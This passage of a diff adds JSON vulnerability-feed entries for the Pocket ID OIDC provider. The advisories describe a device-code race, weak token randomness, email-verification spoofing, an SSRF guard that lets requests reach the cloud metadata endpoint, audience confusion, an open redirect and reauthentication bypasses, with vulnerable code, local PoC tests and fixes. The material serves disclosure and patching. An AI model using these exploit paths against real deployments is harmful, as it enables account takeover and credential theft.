+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-pgqv-hh75-xx4x",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:9afc9b87a185fa1e1507b0883f58c236536b8baec14bf60ae0cc36e358fc8afe",
+      "note": null
+    },
+    {
+      "id": "GHSA-m42g-8627-r44c",
+      "aliases": [],
+      "title": "OAuth device-flow user code approval can be accepted more than once due to non-atomic state transition",
+      "summary": "### Summary\r\nPocket ID's OAuth 2.0 Device Authorization Grant approval path checks whether a user code is unused before accepting it, but the storage update that marks it accepted does not enforce that precondition atomically. If two approval requests load the same unused user-code session before either write completes, both can call `AcceptDeviceCodeSessionByUserCodeSignature` successfully. The later write wins and can overwrite the device-code session with a different authenticated user session.\r\n\r\n## Affected area\r\n\r\n- `backend/internal/oidc/device_service.go`\r\n- `backend/internal/oidc/store.go`\r\n- Local audit commit: `6e859de2dd55dfc59d9cde3fab5d7a9789c6aca9`\r\n\r\n## Root cause\r\n\r\n`acceptDeviceCode` checks `request.GetUserCodeState() != fosite.UserCodeUnused` after loading the user-code request:\r\n\r\n```go\r\nif request.GetUserCodeState() != fosite.UserCodeUnused {\r\n        return &common.OidcInvalidDeviceCodeError{}\r\n}\r\n```\r\n\r\nBut `AcceptDeviceCodeSessionByUserCodeSignature` later updates both the device-code and user-code rows by `request_id` only:\r\n\r\n```go\r\nWhere(\"kind IN ? AND request_id = ?\", []string{sessionKindDeviceCode, sessionKindUserCode}, userCodeSession.RequestID).\r\nUpdates(map[string]any{\r\n        \"request_data\": requestData,\r\n})\r\n```\r\n\r\nThere is no conditional write proving the stored user-code session is still unused at update time. The method also mutates the caller-supplied stale request with `request.SetUserCodeState(fosite.UserCodeAccepted)` before writing it.\r\n\r\n## Impact\r\n\r\nAn OAuth device-flow user code is intended to be approved once. Under a race, two approvals can succeed against the same pending device authorization. If an attacker obtains or social-engineers the user code and races the legitimate user, they may be able to bind the pending device authorization to their account before the device polls the token endpoint. At minimum, the authorization server records multiple successful approvals for a single-use user code, and the final persisted authenticated session is determined by the last write.\r\n\r\n## Local proof\r\n\r\nAdd this regression test to `backend/internal/oidc/device_service_test.go`:\r\n\r\n```go\r\nfunc TestStoreAcceptDeviceCodeSessionByUserCodeSignatureRejectsSecondAccept(t *testing.T) {\r\n        const (\r\n                userID   = \"test-user\"\r\n                clientID = \"test-client\"\r\n        )\r\n        service, store, _, userCode, _ := newTestDeviceServiceWithCode(t, clientID, userID, false, nil)\r\n\r\n        firstRequest, userCodeSignature, err := service.deviceRequestFromUserCode(t.Context(), userCode)\r\n        require.NoError(t, err)\r\n        secondRequest, _, err := service.deviceRequestFromUserCode(t.Context(), userCode)\r\n        require.NoError(t, err)\r\n\r\n        _, err = store.AcceptDeviceCodeSessionByUserCodeSignature(t.Context(), userCodeSignature, firstRequest)\r\n        require.NoError(t, err)\r\n\r\n        _, err = store.AcceptDeviceCodeSessionByUserCodeSignature(t.Context(), userCodeSignature, secondRequest)\r\n        require.Error(t, err)\r\n}\r\n```\r\n\r\nRun:\r\n\r\n```bash\r\ncd backend\r\ngo test -tags=exclude_frontend,unit ./internal/oidc -run 'TestStoreAcceptDeviceCodeSessionByUserCodeSignatureRejectsSecondAccept' -count=1 -v\r\n```\r\n\r\nObserved result:\r\n\r\n```text\r\nError: An error is expected but got nil.\r\nTest: TestStoreAcceptDeviceCodeSessionByUserCodeSignatureRejectsSecondAccept\r\n```\r\n\r\nThe SQL log shows both accept calls updating both rows:\r\n\r\n```text\r\nUPDATE `oauth2_sessions` SET `request_data`=... WHERE kind IN ('device_code','user_code') AND request_id = ...\r\n```\r\n\r\n## Suggested fix\r\n\r\nMake the acceptance a compare-and-set operation inside the same transaction as the approval:\r\n\r\n- Re-read or lock the current user-code row during acceptance.\r\n- Decode/verify the stored request still has `UserCodeUnused`.\r\n- Update only if that condition is true.\r\n- Return an invalid/expired device-code error if no row was updated.\r\n\r\nA stronger schema-level fix would store `user_code_state` as a real index...",
+      "published_at": "2026-07-29T23:03:16.000Z",
+      "modified_at": "2026-07-29T23:03:16.000Z",
+      "severity": {
+        "level": "low",
+        "score": 3.7,
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-362"
+      ],
+      "affected": [
+        {
+          "product": "pocket-id",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.12.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-m42g-8627-r44c",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-m42g-8627-r44c",
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-m42g-8627-r44c",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:9afc9b87a185fa1e1507b0883f58c236536b8baec14bf60ae0cc36e358fc8afe",
+      "note": null
+    },
+    {
+      "id": "GHSA-cqmm-wq4p-9wp5",
+      "aliases": [],
+      "title": "Correlated characters in security-sensitive tokens due to incorrect random-buffer indexing",
+      "summary": "### Summary\r\n\r\nPocket ID's cryptographically secure random-string generator indexes its random-byte buffer using the requested output length instead of the buffer size. This causes random bytes to be reused before the buffer is refilled, introducing significant correlations between characters in security-sensitive tokens.\r\n\r\nFor six-character one-time access codes, the first and last characters are equal approximately **34.7%** of the time instead of the expected **1.85%**. Exploitation requires partial knowledge of an active token and substantial online guessing, so rate limiting materially reduces the practical risk.\r\n\r\n**Severity:** Medium  \r\n**CWE:** CWE-331 - Insufficient Entropy  \r\n**CVSS:** `CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N` (6.3)\r\n\r\n### Details\r\n\r\nThe vulnerable code is in `backend/internal/utils/string_util.go:42-55`:\r\n\r\n```go\r\nbufferSize := int(float64(length) * 1.3)\r\nrandomBytes := make([]byte, bufferSize)\r\n\r\nfor i, j := 0, 0; i < length; j++ {\r\n    if j%bufferSize == 0 {\r\n        _, err := io.ReadFull(rand.Reader, randomBytes)\r\n        // ...\r\n    }\r\n\r\n    idx := int(randomBytes[j%length] & letterIdxMask)\r\n```\r\n\r\nThe buffer is refilled according to `j % bufferSize`, but indexed according to `j % length`. Because `bufferSize` is defined as `1.3 * length`, the index wraps before the end of the buffer.\r\n\r\nFor a six-character token:\r\n\r\n- `length = 6`\r\n- `bufferSize = 7`\r\n- Attempts `j=0` and `j=6` both read `randomBytes[0]`\r\n- If accepted by the rejection sampler, both attempts produce the same character\r\n\r\nRejection sampling means attempt positions do not always map directly to output positions, but the resulting output correlation is readily measurable.\r\n\r\nThe generator is used for:\r\n\r\n- 6- and 16-character one-time access tokens\r\n- 16-character one-time-access device tokens\r\n- 16-character signup tokens\r\n- 32-character email-verification tokens\r\n- 32-character WebAuthn reauthentication tokens\r\n- 32-character API keys\r\n- 32-character OIDC client secrets\r\n\r\nThe six-character one-time access code is the most materially affected because it has the smallest nominal search space. It is generated when the TTL is at most 15 minutes in `backend/internal/service/one_time_access_service.go:231-245`.\r\n\r\nThe exchange endpoint is unauthenticated but rate-limited per client IP to one request every 10 seconds with a burst of five:\r\n\r\n- Route: `backend/internal/controller/user_controller.go:55`\r\n- Policy: `backend/internal/middleware/rate_limit.go:54`\r\n\r\nThe fix is to index the buffer using its actual size:\r\n\r\n```diff\r\n- idx := int(randomBytes[j%length] & letterIdxMask)\r\n+ idx := int(randomBytes[j%bufferSize] & letterIdxMask)\r\n```\r\n\r\n### PoC\r\n\r\nNo running Pocket ID instance or special configuration is required.\r\n\r\nCreate `backend/internal/utils/entropy_poc_test.go`:\r\n\r\n```go\r\npackage utils\r\n\r\nimport (\r\n    \"testing\"\r\n)\r\n\r\nfunc TestOneTimeTokenCharacterCorrelation(t *testing.T) {\r\n    const samples = 100_000\r\n\r\n    equal := 0\r\n    for range samples {\r\n        token, err := GenerateRandomUnambiguousString(6)\r\n        if err != nil {\r\n            t.Fatal(err)\r\n        }\r\n\r\n        if token[0] == token[5] {\r\n            equal++\r\n        }\r\n    }\r\n\r\n    rate := float64(equal) / samples\r\n    t.Logf(\"P(token[0] == token[5]) = %.4f\", rate)\r\n\r\n    // A uniform 54-character generator should produce approximately\r\n    // 1/54 = 0.0185. The vulnerable implementation produces ~0.347.\r\n    if rate < 0.30 {\r\n        t.Fatalf(\"expected elevated correlation, got %.4f\", rate)\r\n    }\r\n}\r\n```\r\n\r\nRun from `backend/`:\r\n\r\n```shell\r\ngo test -tags=exclude_frontend,unit \\\r\n  ./internal/utils \\\r\n  -run TestOneTimeTokenCharacterCorrelation \\\r\n  -count=1 -v\r\n```\r\n\r\nObserved against the vulnerable implementation:\r\n\r\n```text\r\n=== RUN   TestOneTimeTokenCharacterCorrelation\r\n    entropy_poc_test.go:23: P(token[0] == token[5]) = 0.3463\r\n--- PASS: TestOneTimeTokenCharacterCorrelation (0.01s)\r\n```\r\n\r\nAfter changing `j%length` to `j%bu...",
+      "published_at": "2026-07-29T23:03:00.000Z",
+      "modified_at": "2026-07-29T23:05:19.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.3,
+        "vector": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-331"
+      ],
+      "affected": [
+        {
+          "product": "pocket-id",
+          "ranges": [
+            {
+              "introduced": "0.40.1",
+              "fixed": "2.12.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-cqmm-wq4p-9wp5",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-cqmm-wq4p-9wp5",
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-cqmm-wq4p-9wp5",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:396b1deca9e97e0448a3ce9c9f45fb7895b395503c3959f06ff24c94eb333395",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-115770",
+      "aliases": [
+        "GHSA-rm8c-2cv8-jwf6"
+      ],
+      "title": "Pocket ID: Email verification token remains valid after address change, enabling arbitrary verified-email spoofing",
+      "summary": "Pocket ID is an OIDC provider that allows users to authenticate with their passkeys to services. From 2.2.0 until 2.12.0, SendEmailVerification uses the token model in backend/internal/model/email_verification_token.go to bind an email-verification token only to the user's identifier, while UpdateUser can change the account email without invalidating the outstanding token and VerifyEmail marks the current address as verified. An ordinary user can request a token for an address they control, change the account to an arbitrary unused address, and redeem the old token so Pocket ID publishes the new address with email_verified set to true. The default affected configuration uses emailsVerified=false and allowOwnAccountEdit=true; the target address must not already belong to another Pocket ID user. A relying application that trusts a verified email for automatic account matching or provisioning can link the attacker's identity to another user's account, while applications that rely exclusively on the stable OIDC sub claim are not affected by that downstream consequence. This issue is fixed in version 2.12.0.",
+      "published_at": "2026-07-29T23:02:34.000Z",
+      "modified_at": "2026-11-09T21:58:14.019Z",
+      "severity": {
+        "level": "critical",
+        "score": 9.6,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00166,
+        "percentile": 0.05964,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-345"
+      ],
+      "affected": [
+        {
+          "product": "pocket-id",
+          "ranges": [
+            {
+              "introduced": "2.2.0",
+              "fixed": "2.12.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-rm8c-2cv8-jwf6",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/pocket-id/pocket-id/pull/1625",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/pocket-id/pocket-id/commit/43aaccd5bfacb76283b11ce039fb3f0716196fcb",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/pocket-id/pocket-id/releases/tag/v2.12.0",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-115770",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-115770",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-115770",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-115770",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-rm8c-2cv8-jwf6",
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-rm8c-2cv8-jwf6",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:a8f5b633ba276ecb13d0c3da08dee7211c8b47ec8b5e6ce90b2104b5a0cdb8b0",
+      "note": null
+    },
+    {
+      "id": "GHSA-j5w6-26x9-fc2q",
+      "aliases": [],
+      "title": "SSRF guard treats IPv4 link-local 169.254.0.0/16 as public - admin OIDC-client logo fetch can reach cloud metadata (IMDS)",
+      "summary": "## Summary\r\n\r\nThe SSRF protection used when Pocket ID fetches a remote OIDC-client logo (`POST /api/oidc/clients` / `PUT /api/oidc/clients/:id`, body fields `logoUrl` / `darkLogoUrl`) classifies the IPv4 link-local range `169.254.0.0/16` as a **public** address. Because `169.254.0.0/16` is where cloud platforms expose their Instance Metadata Service (AWS/GCP/Azure IMDS `169.254.169.254`, AWS ECS task-metadata `169.254.170.2`), an authenticated administrator can supply a logo URL that causes the Pocket ID server to issue an outbound HTTP GET to the cloud metadata endpoint, against the intent of the SSRF guard. The guard correctly blocks loopback, RFC1918 and CGNAT, but the link-local range is missing from the block list.\r\n\r\n## Reachability / How input reaches sink\r\n\r\n- Network route: `POST /api/oidc/clients` (createClientHandler) and `PUT /api/oidc/clients/:id` (updateClientHandler), both behind `authMiddleware.Add()` (administrator session required).\r\n- Tainted body fields `logoUrl` / `darkLogoUrl` flow into `downloadAndSaveLogoFromURL`, whose only SSRF gate is `utils.IsURLPrivate` → `IsPrivateIP`.\r\n\r\n## Affected component\r\n\r\n- File: `backend/internal/utils/ip_util.go`\r\n- Function: `IsPrivateIP` (consumed by `IsURLPrivate`)\r\n- Sink: `backend/internal/service/oidc_service.go` → `downloadAndSaveLogoFromURL` (the OIDC-client logo fetcher), reached from `createClientHandler` and `updateClientHandler`.\r\n- Version verified vulnerable: **v2.8.0** (latest release at time of report).\r\n\r\n## Details\r\n\r\n`IsPrivateIP` is built from a fixed list of CIDR blocks:\r\n\r\n```go\r\nvar localhostIPNets = []*net.IPNet{\r\n    {IP: net.IPv4(127, 0, 0, 0), Mask: net.CIDRMask(8, 32)},  // 127.0.0.0/8\r\n    {IP: net.IPv6loopback, Mask: net.CIDRMask(128, 128)},     // ::1/128\r\n}\r\nvar privateLanIPNets = []*net.IPNet{\r\n    {IP: net.IPv4(10, 0, 0, 0), Mask: net.CIDRMask(8, 32)},     // 10.0.0.0/8\r\n    {IP: net.IPv4(172, 16, 0, 0), Mask: net.CIDRMask(12, 32)},  // 172.16.0.0/12\r\n    {IP: net.IPv4(192, 168, 0, 0), Mask: net.CIDRMask(16, 32)}, // 192.168.0.0/16\r\n}\r\nvar tailscaleIPNets = []*net.IPNet{\r\n    {IP: net.IPv4(100, 64, 0, 0), Mask: net.CIDRMask(10, 32)}, // 100.64.0.0/10\r\n}\r\n\r\nfunc IsPrivateIP(ip net.IP) bool {\r\n    return IsLocalhostIP(ip) || IsPrivateLanIP(ip) || IsTailscaleIP(ip) || IsLocalIPv6(ip)\r\n}\r\n```\r\n\r\n`IsLocalIPv6` only matches operator-configured ranges (`LocalIPv6Ranges`, empty by default). There is no entry for the IPv4 link-local range `169.254.0.0/16` nor the IPv6 link-local range `fe80::/10` nor the unspecified addresses `0.0.0.0` / `::`. Consequently `IsURLPrivate` returns `(false, nil)` - i.e. \"not private, allowed\" - for any hostname that resolves into `169.254.0.0/16`.\r\n\r\n`downloadAndSaveLogoFromURL` calls `IsURLPrivate` both on the initial URL and inside the redirect `CheckRedirect` callback, so a public→`169.254.x` redirect bypasses identically.\r\n\r\nBecause the dominant exploitation target is the deterministic literal IP `http://169.254.169.254/...` (cloud metadata), no DNS rebinding is required. On a Pocket ID instance deployed in a cloud environment (AWS/GCP/Azure/ECS), an administrator can read the instance metadata service - including, on AWS IMDSv1 / improperly-configured IMDSv2, temporary IAM role credentials.\r\n\r\nNote on IPv6 transition forms: Go's `net.ParseIP` canonicalises an IPv4-mapped address such as `::ffff:169.254.169.254` to its 4-byte form, so the mapped variant is also classified as public and bypasses; mapped-loopback `::ffff:127.0.0.1` is correctly blocked because it canonicalises into the guarded `127.0.0.0/8`.\r\n\r\n## PoC / Proof of concept\r\n\r\nTested against a freshly deployed Pocket ID `v2.8.0` (official `ghcr.io/pocket-id/pocket-id:v2.8.0` image) in Docker, with two HTTP collectors joined to the same Docker networks:\r\n- `collector-imds` bound to `169.254.169.254` (simulated cloud metadata endpoint - the guard *should* block this but does not)\r\n- `collector-priv` bound to `192.168.250.254` (RFC1918 - negative cont...",
+      "published_at": "2026-07-13T09:04:35.000Z",
+      "modified_at": "2026-07-13T09:04:35.000Z",
+      "severity": {
+        "level": "low",
+        "score": 3,
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:L/I:N/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-918"
+      ],
+      "affected": [
+        {
+          "product": "pocket-id",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.11.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-j5w6-26x9-fc2q",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-j5w6-26x9-fc2q",
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-j5w6-26x9-fc2q",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:47386bae5ead937fc438a08c952ea3d3b4ab354de45a5237076f7e2264a7e7d5",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-62662",
+      "aliases": [
+        "GHSA-q4xm-p75h-h9p3"
+      ],
+      "title": "Pocket ID: Client credentials grant allows any OIDC client to obtain tokens for arbitrary audiences",
+      "summary": "Pocket ID is an OIDC provider that allows users to authenticate with their passkeys to services. From 1.11.0 until 2.10.0, createTokenFromClientCredentials in backend/internal/service/oidc_service.go accepts the client-controlled resource parameter and embeds it directly in the access token aud claim without validating that the audience is registered or that the requesting client may access it. Any authenticated OIDC client can therefore obtain a Pocket ID-signed token naming another client or an arbitrary audience. The /api/oidc/introspect endpoint cannot distinguish the unauthorized token because it treats a token as active when the introspecting client's identifier matches the attacker-selected audience. In deployments where resource servers trust Pocket ID access tokens for service-to-service authorization, this bypasses audience-based access controls and can permit unauthorized data access or actions; deployments that do not use these tokens for resource-server authorization have no immediate exploitable impact. This issue is fixed in version 2.10.0.",
+      "published_at": "2026-07-13T09:04:15.000Z",
+      "modified_at": "2026-11-09T21:56:51.843Z",
+      "severity": {
+        "level": "high",
+        "score": 7.7,
+        "vector": "CVSS:3.0/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00266,
+        "percentile": 0.18678,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-20",
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "pocket-id",
+          "ranges": [
+            {
+              "introduced": "1.11.0",
+              "fixed": "2.10.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-q4xm-p75h-h9p3",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/pocket-id/pocket-id/pull/1520",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/pocket-id/pocket-id/commit/8158452b37304115c97c61c3a56082ce938ce6f0",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/pocket-id/pocket-id/releases/tag/v2.10.0",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-62662",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-62662",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-62662",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-62662",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-q4xm-p75h-h9p3",
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-q4xm-p75h-h9p3",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:cba022fe3691dd5d01ad984a50824170d7c3e2f308d70f4de9919d364529ae8b",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-55834",
+      "aliases": [
+        "GHSA-2wvm-8mvp-22qv"
+      ],
+      "title": "Pocket ID: Open Redirect on the OIDC /authorize page via unvalidated redirect_uri with prompt=none",
+      "summary": "Pocket ID is an OIDC provider that allows users to authenticate with their passkeys to services. From 2.6.0 until 2.9.0, frontend/src/routes/authorize/+page.ts reads the redirect_uri query parameter and frontend/src/routes/authorize/+page.svelte uses the raw callbackURL in redirectWithError when prompt=none cannot complete silent authorization. The client-side path only blocks javascript and data schemes and does not invoke the backend callback allow-list validation, so an unauthenticated attacker who knows a valid client_id can redirect a victim browser to an arbitrary HTTP or HTTPS origin for phishing or OIDC error and state smuggling. This issue is fixed in version 2.9.0.",
+      "published_at": "2026-06-16T10:14:54.000Z",
+      "modified_at": "2026-08-28T20:28:38.924Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00373,
+        "percentile": 0.31788,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-601"
+      ],
+      "affected": [
+        {
+          "product": "pocket-id",
+          "ranges": [
+            {
+              "introduced": "2.6.0",
+              "fixed": "2.9.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-2wvm-8mvp-22qv",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/pocket-id/pocket-id/commit/8a7577497131229badb35cb4b3a4227b1300afff",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/pocket-id/pocket-id/releases/tag/v2.9.0",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-55834",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-55834",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-55834",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-55834",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-2wvm-8mvp-22qv",
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-2wvm-8mvp-22qv",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:00ec4733e71b1383bd692aca5c318304675970d919c756c6536f5ab2eee70b83",
+      "note": null
+    },
+    {
+      "id": "GHSA-hp74-gm6m-2qm5",
+      "aliases": [],
+      "title": "Reauthentication bypass via one-time access token login - passkey step-up requirement defeated by JWT freshness check that accepts any login method",
+      "summary": "# Reauthentication Bypass via One-Time Access Token Login\r\n\r\n## Summary\r\n\r\nA weaker authentication method (OTA token or signup token) is accepted as passkey step-up proof, yielding unauthorized renewable 30-day OIDC refresh tokens for clients explicitly configured with `RequiresReauthentication: true`. The `POST /api/webauthn/reauthenticate` endpoint's access-token fallback checks only JWT freshness (`IssuedAt` within 60 seconds), not the authentication method used. The session cookie gate is also non-validating -- any arbitrary cookie value (e.g. `session=deadbeef`) is accepted, collapsing the reauth boundary to token recency alone.\r\n\r\nThe bypass needs to succeed only once. The resulting OIDC grant includes a 30-day refresh token that can be rotated indefinitely, providing persistent victim-impersonation access to the protected downstream service. The attacker obtains `access_token` (1-hour TTL), `id_token` (victim's name, email, profile), and `refresh_token` (30-day TTL, renewable) for a client that was explicitly configured to require passkey step-up authentication. The attacker can perform victim-scoped actions at the downstream relying party indefinitely.\r\n\r\n## Root Cause\r\n\r\n`CreateReauthenticationTokenWithAccessToken` (webauthn_service.go:362-403) only checks that the access token's `IssuedAt` claim is less than 60 seconds old:\r\n\r\n```go\r\n// webauthn_service.go:378-381\r\ntokenExpiration, ok := token.IssuedAt()\r\nif !ok || time.Since(tokenExpiration) > time.Minute {\r\n    return \"\", &common.ReauthenticationRequiredError{}\r\n}\r\n```\r\n\r\nIt does not check HOW the user originally authenticated. The `reauthenticateHandler` (webauthn_controller.go:179-207) falls into this path whenever the request body cannot be parsed as a WebAuthn credential assertion:\r\n\r\n```go\r\n// webauthn_controller.go:189-199\r\ncredentialAssertionData, err := protocol.ParseCredentialRequestResponseBody(c.Request.Body)\r\nif err == nil {\r\n    token, err = wc.webAuthnService.CreateReauthenticationTokenWithWebauthn(...)\r\n} else {\r\n    // FALLBACK: Only checks access token age, not auth method\r\n    accessToken, _ := c.Cookie(cookie.AccessTokenCookieName)\r\n    token, err = wc.webAuthnService.CreateReauthenticationTokenWithAccessToken(c.Request.Context(), accessToken)\r\n}\r\n```\r\n\r\nAdditionally, the handler's session cookie check (line 180) only verifies that a cookie named `session` exists -- it does not validate the cookie value against any server-side session store. Any arbitrary value (e.g. `session=deadbeef`) satisfies the check:\r\n\r\n```go\r\n// webauthn_controller.go:180-184\r\nsessionID, err := c.Cookie(cookie.SessionIdCookieName)\r\nif err != nil {\r\n    _ = c.Error(&common.MissingSessionIdError{})\r\n    return\r\n}\r\n// sessionID is passed to CreateReauthenticationTokenWithWebauthn but NOT\r\n// to CreateReauthenticationTokenWithAccessToken (the fallback path)\r\n```\r\n\r\nIn the fallback path, the `sessionID` variable is never used. The session cookie is a gate check only -- presence, not validity. This means the reauth boundary is not bound to a real authenticated browser session.\r\n\r\nMeanwhile, `GenerateAccessToken` (jwt_service.go:190-195) always sets `IssuedAt(now)` regardless of how authentication was performed:\r\n\r\n```go\r\n// jwt_service.go:191-195\r\nnow := time.Now()\r\ntoken, err := jwt.NewBuilder().\r\n    Subject(user.ID).\r\n    Expiration(now.Add(...)).\r\n    IssuedAt(now).  // Always \"now\" - regardless of auth method\r\n```\r\n\r\nThis function is called by:\r\n1. WebAuthn login (intended passkey path)\r\n2. One-time access token exchange (one_time_access_service.go:200)\r\n3. User signup (user_signup_controller.go:182)\r\n\r\nAll three produce tokens that bypass the reauthentication freshness check.\r\n\r\n## Attack Chain\r\n\r\n**Precondition**: An OIDC client has `RequiresReauthentication: true`. The attacker has obtained a one-time access token (via email compromise, admin-issued token, or if unauthenticated OTP emails are enabled).\r\n\r\n1. **Exchange OTA for fresh JWT**: `POST /api/one-time-access-...",
+      "published_at": "2026-04-26T17:46:15.000Z",
+      "modified_at": "2026-07-26T18:32:19.000Z",
+      "severity": {
+        "level": "medium",
+        "score": null,
+        "vector": null,
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-287"
+      ],
+      "affected": [
+        {
+          "product": "pocket-id",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.6.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-hp74-gm6m-2qm5",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-hp74-gm6m-2qm5",
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-hp74-gm6m-2qm5",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:195219c8f0abae6722fef6481d86a2ab74a1d79a66b73f635f6631ccf4a85669",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-43983",
+      "aliases": [
+        "GHSA-w6p7-2fxx-4f44"
+      ],
+      "title": "Pocket ID: OIDC refresh token flow bypasses authorization revocation, account disabling, and group restrictions",
+      "summary": "Pocket ID is an OIDC provider that allows users to authenticate with their passkeys to your services. Prior to 2.6.0, The createTokenFromRefreshToken function (oidc_service.go) validates the refresh token's cryptographic integrity but does not re-validate the user's current authorization state before issuing new tokens. This allows (1) the client to refresh the token indefinitely after authorization revocation, (2) the refresh token to continue to work after the account is disabled, and (3) the token to work after the client is removed from the group. This vulnerability is fixed in 2.6.0.",
+      "published_at": "2026-04-26T17:45:52.000Z",
+      "modified_at": "2026-07-26T18:31:52.000Z",
+      "severity": {
+        "level": "high",
+        "score": 8.5,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+        "source": "cna"
+      },
+      "kev": {
